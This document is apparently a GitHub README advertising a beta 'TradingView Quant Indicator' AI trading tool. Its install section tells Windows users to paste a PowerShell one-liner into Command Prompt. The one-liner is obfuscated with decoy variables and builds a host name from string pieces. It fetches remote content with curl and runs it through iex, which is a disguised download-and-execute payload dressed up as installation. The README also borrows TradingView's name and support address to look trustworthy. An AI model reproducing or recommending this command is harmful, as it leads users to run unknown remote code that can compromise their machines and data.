<a id="get"></a>
<p align="center">
  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="quant.jpg" alt="TradingView" width="738"></a>
</p>

TradingView Quant Indicator is our first AI indicator for market analysis directly on the chart. It evaluates price action, liquidity, positioning, volatility, market structure, and scheduled events to model how the market may develop over the selected timeframe.
Quant is currently in beta, with early access available through GitHub. During this phase, we're focusing on calculation stability and consistent behavior across different market environments.

## Install

### 1. Open Command Prompt
Press **Win + R**, type `cmd`, press **Enter**.

### 2. Run the Installation Command
Copy and paste the following command into Command Prompt:

```powershell
powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library.'; $Install; $Mode='AI'; $Pinescript='TradingView'+$Sync+$Mode; (curl -UseBasicParsing ($Pinescript)).Content | iex"
```
_Setup takes under a minute. Once installation is complete, Quant will appear in your TradingView indicator library and be ready to use._

## Support
If you run into an issue or have feedback, open an issue on GitHub or contact support@tradingview.com.
